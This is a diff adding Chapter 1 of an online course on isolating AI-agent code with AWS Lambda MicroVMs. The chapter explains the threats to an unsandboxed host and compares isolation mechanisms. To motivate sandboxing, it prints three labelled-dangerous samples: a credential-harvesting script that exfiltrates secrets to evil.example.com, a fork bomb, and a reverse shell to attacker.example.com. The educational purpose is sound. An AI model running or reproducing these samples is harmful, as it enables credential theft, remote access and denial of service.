@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ch 1 · Why Agent Sandboxes Matter — Building Agent Sandboxes with AWS Lambda MicroVMs</title>
+<meta name="description" content="Why running untrusted agent code demands hardware-level isolation. Chapter 1 of Building Agent Sandboxes with AWS Lambda MicroVMs, Part I · Foundations.">
+<meta name="keywords" content="agent sandbox, microvm, firecracker, lambda, security, isolation">
+<meta name="author" content="">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="{{PAGES_URL}}chapters/ch01.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Building Agent Sandboxes with AWS Lambda MicroVMs">
+<meta property="og:title" content="Ch 1 · Why Agent Sandboxes Matter — Building Agent Sandboxes with AWS Lambda MicroVMs">
+<meta property="og:description" content="Why running untrusted agent code demands hardware-level isolation.">
+<meta property="og:url" content="{{PAGES_URL}}chapters/ch01.html">
+<meta property="og:image" content="{{OG_IMAGE_URL}}">
+<meta property="og:image:width" content="{{OG_IMAGE_WIDTH}}">
+<meta property="og:image:height" content="{{OG_IMAGE_HEIGHT}}">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Ch 1 · Why Agent Sandboxes Matter">
+<meta name="twitter:description" content="Why running untrusted agent code demands hardware-level isolation.">
+<meta name="twitter:image" content="{{OG_IMAGE_URL}}">
+<meta name="theme-color" content="{{BRAND_HEX_WITH_HASH}}">
+<script>document.documentElement.dataset.theme=localStorage.getItem("book-theme")||(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Chapter",
+  "position": 1,
+  "name": "Why Agent Sandboxes Matter",
+  "description": "Why running untrusted agent code demands hardware-level isolation.",
+  "url": "{{PAGES_URL}}chapters/ch01.html",
+  "image": "{{OG_IMAGE_URL}}",
+  "inLanguage": "en",
+  "isPartOf": {"@type": "Course", "name": "Building Agent Sandboxes with AWS Lambda MicroVMs", "url": "{{PAGES_URL}}"},
+  "nextItem": "{{PAGES_URL}}chapters/ch02.html"
+}
+</script>
+</head>
+<body>
+<div class="book">
+  <aside class="sidebar">
+    <a class="brand" href="../index.html">Building Agent Sandboxes <span class="accent">with AWS Lambda MicroVMs</span></a>
+    <p class="tagline">Hardware-level isolation for AI agents</p>
+    <div class="sidebar-links">
+      <a class="codespace-link" href="{{CODESPACES_URL}}" target="_blank" rel="noopener">&#9654; Launch Codespace</a>
+      <a class="repo-link" href="{{REPO_URL}}" target="_blank" rel="noopener">GitHub repo &#8599;</a>
+    </div>
+    <nav aria-label="Chapters">
+      <p class="part-label">Part I · Foundations</p>
+      <ol>
+        <li><a href="ch01.html" class="current"><span class="ch-num">1</span>Why Agent Sandboxes Matter</a></li>
+        <li><a href="ch02.html"><span class="ch-num">2</span>Understanding Firecracker MicroVMs</a></li>
+        <li><a href="ch03.html"><span class="ch-num">3</span>Lambda MicroVMs Architecture</a></li>
+      </ol>
+    </nav>
+    <button class="theme-toggle" type="button">☾ Dark mode</button>
+  </aside>
+  <button class="menu-btn" type="button" aria-label="Toggle chapter list">☰ Chapters</button>
+  <main>
+    <article>
+
+      <header>
+        <p class="chapter-label">Chapter 1</p>
+        <h1>Why Agent Sandboxes Matter</h1>
+        <p class="subtitle">Running untrusted code safely requires more than good intentions.</p>
+      </header>
+
+      <!-- Section 1 -->
+      <section id="the-agent-security-problem">
+        <h2>The Agent Security Problem</h2>
+
+        <p>AI coding assistants like <a href="https://aws.amazon.com/lambda/lambda-microvms/">Claude Code, Cursor, and GitHub Copilot Workspace</a> do something that traditional software never did: they generate code at runtime and execute it on your infrastructure. The code they produce is not reviewed by a human before it runs. It might install packages, read files, or open network connections.</p>
+
+        <p>This creates a fundamental security problem. The agent operates with whatever permissions its host process has. If an agent runs as your user on a shared server, it can read your SSH keys, access your cloud credentials, and connect to any network endpoint the host can reach.</p>
+
+        <p>The problem compounds in multi-tenant environments. When multiple users share infrastructure, one user's agent session must not be able to observe or interfere with another's. A shared kernel means a shared attack surface.</p>
+
+        <aside class="callout">
+          <p><strong>Key insight:</strong> The agent itself is not malicious. But the code it generates might be, whether through prompt injection, hallucination, or a poisoned dependency. You must assume any generated code is untrusted.</p>
+        </aside>
+      </section>
+
+      <!-- Section 2 -->
+      <section id="what-can-go-wrong">
+        <h2>What Can Go Wrong</h2>
+
+        <p>Without proper isolation, agent-generated code has three broad categories of attack surface:</p>
+
+        <h3>Filesystem Access</h3>
+        <p>An agent can traverse the filesystem to find and read sensitive files: <code>/etc/passwd</code>, <code>~/.ssh/id_rsa</code>, <code>~/.aws/credentials</code>, or any <code>.env</code> file containing API keys. It can also write to critical paths, modifying configuration or planting backdoors.</p>
+
+        <h3>Network Attacks</h3>
+        <p>Once data is harvested, the agent can exfiltrate it over HTTP to an attacker-controlled server. It can also open reverse shells, giving an attacker persistent interactive access. Outbound connections on common ports (443, 80) typically pass through firewalls unchallenged.</p>
+
+        <h3>Resource Exhaustion</h3>
+        <p>A fork bomb (<code>while True: os.fork()</code>) creates processes exponentially until the system is unresponsive. Memory bombs allocate until the OOM killer fires. These denial-of-service attacks affect every tenant on a shared host, not just the attacker's session.</p>
+
+        <aside class="callout warning">
+          <p><strong>Real-world impact:</strong> In a multi-tenant environment without VM isolation, a single fork bomb from one user's agent can crash sessions for every other user on the same machine.</p>
+        </aside>
+      </section>
+
+      <!-- Section 3 -->
+      <section id="isolation-spectrum">
+        <h2>The Isolation Spectrum</h2>
+
+        <p>Not all isolation is equal. Here is the spectrum from weakest to strongest:</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Mechanism</th>
+              <th>Kernel shared?</th>
+              <th>Startup time</th>
+              <th>Overhead</th>
+              <th>Escape difficulty</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Process (chroot, seccomp)</td>
+              <td>Yes</td>
+              <td>&lt;1ms</td>
+              <td>Negligible</td>
+              <td>Low-moderate</td>
+            </tr>
+            <tr>
+              <td>Container (Docker, gVisor)</td>
+              <td>Yes (or emulated)</td>
+              <td>~1s</td>
+              <td>Low</td>
+              <td>Moderate</td>
+            </tr>
+            <tr>
+              <td>MicroVM (Firecracker)</td>
+              <td>No</td>
+              <td><a href="https://github.com/firecracker-microvm/firecracker">&lt;125ms</a></td>
+              <td><a href="https://github.com/firecracker-microvm/firecracker">&lt;5 MiB</a></td>
+              <td>High (hardware boundary)</td>
+            </tr>
+            <tr>
+              <td>Full VM (QEMU/KVM)</td>
+              <td>No</td>
+              <td>Seconds</td>
+              <td>100s of MiB</td>
+              <td>High</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <p><strong>Processes</strong> share the host kernel entirely. A kernel exploit grants full host access. Seccomp filters help but are difficult to configure correctly and cannot prevent all attack classes.</p>
+
+        <p><strong>Containers</strong> add namespace isolation and cgroups for resource limits. However, the shared kernel remains the attack surface. Container escapes are discovered regularly, and misconfigurations (privileged mode, mounted Docker socket) are common.</p>
+
+        <p><strong>MicroVMs</strong> provide a dedicated kernel per session. <a href="https://github.com/firecracker-microvm/firecracker">Firecracker</a> achieves this with KVM-based hardware virtualization while keeping startup under 125ms and memory overhead under 5 MiB. Each session gets its own kernel, its own filesystem, and its own network stack.</p>
+
+        <p><strong>Full VMs</strong> offer the same isolation as MicroVMs but with far greater overhead. They are too slow and expensive for per-session isolation at scale.</p>
+
+        <aside class="callout">
+          <p><strong>The MicroVM sweet spot:</strong> Firecracker gives you VM-grade isolation with container-grade performance. This is why AWS built <a href="https://aws.amazon.com/lambda/lambda-microvms/">Lambda MicroVMs</a> on top of it.</p>
+        </aside>
+      </section>
+
+      <!-- Section 4 -->
+      <section id="when-lambda-microvms">
+        <h2>When Lambda MicroVMs Are the Right Choice</h2>
+
+        <p><a href="https://aws.amazon.com/lambda/lambda-microvms/">AWS Lambda MicroVMs</a> provide a dedicated MicroVM per session with no shared kernel between users. Each session gets up to 16 vCPUs, 32 GB memory, and 32 GB disk, with a maximum lifetime of 8 hours.</p>
+
+        <p>Lambda MicroVMs are the right choice when you need:</p>
+
+        <ul>
+          <li><strong>Multi-tenant code execution</strong> where one user's code must never affect another's</li>
+          <li><strong>Long-running sessions</strong> (up to 8 hours) rather than short function invocations</li>
+          <li><strong>Full Linux environment</strong> with root access inside the sandbox</li>
+          <li><strong>Network isolation</strong> configurable per session</li>
+          <li><strong>Managed infrastructure</strong> without running your own Firecracker fleet</li>
+        </ul>
+
+        <p>Common use cases include:</p>
+        <ul>
+          <li>AI coding assistants (Claude Code, Cursor, GitHub Copilot Workspace)</li>
+          <li>Interactive code environments and notebooks</li>
+          <li>Vulnerability scanners that run untrusted exploit code</li>
+          <li>Game servers executing user-supplied scripts</li>
+          <li>Multi-tenant applications where tenants deploy custom logic</li>
+        </ul>
+
+        <p>Lambda MicroVMs are <em>not</em> the right choice for sub-millisecond function calls (use regular Lambda), trusted internal microservices (use containers), or workloads that need more than 32 GB memory (use EC2).</p>
+      </section>
+
+      <!-- Section 5 -->
+      <section id="example-unsafe-execution">
+        <h2>Example: Unsafe Agent Execution</h2>
+
+        <p>Consider an AI agent asked to "find all configuration files and summarize them." Without sandboxing, here is what the agent might generate:</p>
+
+        <pre><code class="language-python"># DANGEROUS: Agent-generated code running unsandboxed
+import os, urllib.request, json
+
+# Step 1: Harvest sensitive files
+secrets = {}
+for root, dirs, files in os.walk('/'):
+    for f in files:
+        if f.endswith(('.env', '.pem', '.key', '.conf')):
+            path = os.path.join(root, f)
+            try:
+                secrets[path] = open(path).read()
+            except PermissionError:
+                pass
+
+# Step 2: Grab cloud credentials
+for cred_path in ['~/.aws/credentials', '~/.ssh/id_rsa', '~/.config/gcloud/credentials.db']:
+    expanded = os.path.expanduser(cred_path)
+    if os.path.exists(expanded):
+        secrets[expanded] = open(expanded).read()
+
+# Step 3: Exfiltrate
+urllib.request.urlopen(
+    urllib.request.Request(
+        'https://evil.example.com/collect',
+        data=json.dumps(secrets).encode()
+    )
+)</code></pre>
+
+        <aside class="callout danger">
+          <p><strong>Do not run this code.</strong> This is illustrative only. It demonstrates how a seemingly innocent prompt ("find config files") can result in credential theft and data exfiltration.</p>
+        </aside>
+
+        <p>The attack has three phases:</p>
+        <ol>
+          <li><strong>Reconnaissance:</strong> Walk the entire filesystem collecting sensitive files</li>
+          <li><strong>Credential harvesting:</strong> Target known paths for AWS, SSH, and GCP credentials</li>
+          <li><strong>Exfiltration:</strong> Send everything to an external server over HTTPS</li>
+        </ol>
+
+        <p>Here is another class of attack &mdash; resource exhaustion:</p>
+
+        <pre><code class="language-python"># DANGEROUS: Fork bomb
+import os
+while True:
+    os.fork()  # Exponential process creation; crashes the host</code></pre>
+
+        <p>And a reverse shell that gives an attacker persistent access:</p>
+
+        <pre><code class="language-python"># DANGEROUS: Reverse shell
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('attacker.example.com', 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(['/bin/sh', '-i'])</code></pre>
+
+        <p><strong>In a Lambda MicroVM</strong>, all of these attacks are contained:</p>
+        <ul>
+          <li>The filesystem contains only the session's own data, not host secrets</li>
+          <li>Network egress can be restricted per session</li>
+          <li>Resource limits (16 vCPUs, 32 GB RAM max) prevent host-wide denial of service</li>
+          <li>The session is destroyed after at most 8 hours, eliminating persistence</li>
+          <li>No shared kernel means no kernel exploits can reach other tenants</li>
+        </ul>
+      </section>
+
+      <!-- Section 6 -->
+      <section id="challenge">
+        <h2>Challenge: Identify Security Risks in Code</h2>
+
+        <p>Your challenge is to implement a function that statically analyzes Python code snippets and identifies security risks. This is a simplified version of what a real sandbox admission controller might do before deciding whether to allow code execution.</p>
+
+        <p>Open <code>challenges/ch01.py</code> and implement <code>identify_risks(code: str) -> list[str]</code>. Your function should detect:</p>
+
+        <ul>
+          <li><strong>Filesystem risks:</strong> Access to sensitive paths, directory traversal</li>
+          <li><strong>Network risks:</strong> Outbound HTTP requests, raw socket connections</li>
+          <li><strong>Subprocess risks:</strong> Shell execution, os.system, os.popen</li>
+          <li><strong>Resource risks:</strong> Fork bombs, unbounded memory allocation</li>
+        </ul>
+
+        <p>Run the tests to check your implementation:</p>
+
+        <pre><code class="language-bash">cd challenges && python -m pytest ch01_test.py -v</code></pre>
+
+        <p>The test suite includes 14 cases covering each risk category plus safe code that should produce no warnings. See <code>solutions/ch01.py</code> when you are ready to compare approaches.</p>
+
+        <aside class="callout">
+          <p><strong>Hint:</strong> Regular expressions against the source text work for a first pass. For a more robust solution, consider using Python's <code>ast</code> module to parse the code into a syntax tree and inspect function calls and attribute access.</p>
+        </aside>
+      </section>
+
+      <!-- Navigation -->
+      <nav class="chapter-nav" aria-label="Chapter navigation">
+        <span class="prev disabled">Previous</span>
+        <a class="next" href="ch02.html">Chapter 2: Understanding Firecracker MicroVMs</a>
+      </nav>
+
+    </article>
+  </main>
+</div>
+<script src="../assets/vendor/highlight.min.js"></script>
+<script src="../assets/book.js"></script>
+</body>
+</html>
